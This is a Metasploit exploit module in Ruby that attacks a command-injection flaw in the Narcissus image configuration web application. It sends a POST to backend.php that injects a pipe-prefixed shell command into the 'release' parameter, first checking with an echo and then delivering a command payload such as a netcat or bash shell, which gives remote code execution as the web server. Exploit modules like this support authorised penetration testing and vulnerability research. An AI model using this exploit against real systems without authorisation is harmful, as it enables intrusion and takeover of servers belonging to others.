##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info={})
		super(update_info(info,
			'Name'           => "Narcissus Image Configuration Passthru Vulnerability",
			'Description'    => %q{
					This module exploits a vulnerability found in Narcissus image configuration
				function.  This is due to the backend.php file not handling the $release parameter
				properly, and then passes it on to the configure_image() function.  In this
				function, the $release parameter can be used to inject system commands for
				passthru (a PHP function that's meant to be used to run a bash script by the
				vulnerable application), which allows remote code execution under the context
				of the web server.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Dun',    #Original
					'sinn3r'  #Metasploit
				],
			'References'     =>
				[
					[ 'EDB', '22709' ],
					[ 'BID', '87410' ]
				],
			'Payload'        =>
				{
					'BadChars' => "\x00\x0d\x0a"
				},
			'Platform'       => ['unix', 'linux'],
			'Arch'           => ARCH_CMD,
			'Compat'         =>
				{
					'PayloadType' => 'cmd',
					'RequiredCmd' => 'generic perl ruby python bash netcat-e'
				},
			'Targets'        =>
				[
					['Narcissus', {}]
				],
			'Privileged'     => false,
			'DisclosureDate' => "Nov 14 2012",
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('TARGETURI', [true, 'The URI path to the web application', '/narcissus-master/'])
			], self.class)
	end

	def base
		uri = target_uri.path
		uri << '/' if uri[-1,1] != '/'
		return uri
	end

	def peer
		"#{rhost}:#{rport}"
	end

	def remote_exe(command)
		res = send_request_cgi({
			'uri'      => "#{base}backend.php",
			'method'   => 'POST',
			'encode_params' => false,
			'vars_post' => {
				'machine' => '0',
				'action'  => 'configure_image',
				'release' => "|#{command}"
			}
		})

		vprint_line(res.body) if res
		return res
	end

	def check
		sig = rand_text_alpha(rand(10) + 5)  #The string to check

		print_status("#{peer} - Looking for signature '#{sig}'...")
		res = remote_exe("echo #{sig}")

		if res and res.body =~ /#{sig}/
			print_status("#{peer} - Signature '#{sig}' found.")
			return Exploit::CheckCode::Vulnerable
		else
			print_status("#{peer} - Signature not found")
			return Exploit::CheckCode::Safe
		end
	end

	def exploit
		print_status("#{peer} - Sending malicious request...")
		remote_exe(payload.encoded)
	end


end